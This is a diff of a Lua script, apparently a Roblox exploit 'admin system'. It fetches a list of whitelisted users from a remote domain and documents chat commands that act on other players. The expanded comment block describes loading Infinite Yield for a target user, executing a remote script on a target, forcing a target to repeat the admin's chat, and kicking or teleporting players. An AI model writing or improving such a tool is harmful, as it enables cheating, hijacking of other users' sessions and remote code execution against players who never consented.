@@ -12,19 +12,25 @@ end
 local whitelistedUsers = {}
 
 -- Fetch whitelist from remote server
-local url = "https://javalstas.com/whitelisted.txt"
-local response = http_request({
-    Url = url,
-    Method = "GET"
-})
+local url = "https://javalsta.com/whitelisted.txt"
+local success, response = pcall(function()
+    return http_request({
+        Url = url,
+        Method = "GET"
+    })
+end)
 
-if response.StatusCode == 200 then
+if success and response and response.StatusCode == 200 then
     for line in response.Body:gmatch("[^\r\n]+") do
         whitelistedUsers[line:lower()] = true
     end
     print("[Admin System] Whitelist loaded successfully!")
 else
-    warn("[Admin System] Failed to fetch whitelist. StatusCode:", response.StatusCode)
+    local errorMsg = success and (response and response.StatusCode or "no response") or "request failed"
+    warn("[Admin System] Failed to fetch whitelist. Error:", errorMsg)
+    warn("[Admin System] Continuing without whitelist - commands will not work until whitelist is loaded")
+    -- Optionally add fallback usernames here
+    -- whitelistedUsers["yourusername"] = true
 end
 
 -- Get services
@@ -177,10 +183,32 @@ end)
 
 print("[Admin System] Loaded successfully. Listening for whitelisted commands...")
 
--- Available commands:
--- .kick <user> - Kicks the target user
--- .inf <user> - Loads Infinite Yield for the target user
--- .tp <user1> <user2> - Teleports user1 to user2
--- .run <user> - Runs a remote script on the target user
--- .control <user> - Controls the target user's chat for 20 seconds
--- .bring <user> - Brings the target user to the admin
+--[[
+    ADMIN COMMANDS - Chat Examples:
+    
+    .kick <user>
+        Example: ".kick John" or ".kick Joh" (partial names work)
+        Description: Kicks the target user from the game
+    
+    .inf <user>
+        Example: ".inf John" or ".inf Joh"
+        Description: Loads Infinite Yield admin script for the target user
+    
+    .tp <user1> <user2>
+        Example: ".tp John Mike" or ".tp Joh Mik"
+        Description: Teleports user1 to user2's location
+    
+    .run <user>
+        Example: ".run John" or ".run Joh"
+        Description: Executes a remote script on the target user
+    
+    .control <user>
+        Example: ".control John" or ".control Joh"
+        Description: Makes the target user repeat everything you say in chat for 20 seconds
+    
+    .bring <user>
+        Example: ".bring John" or ".bring Joh"
+        Description: Teleports the target user to your location
+    
+    Note: All commands support partial username matching (case-insensitive)
+--]]
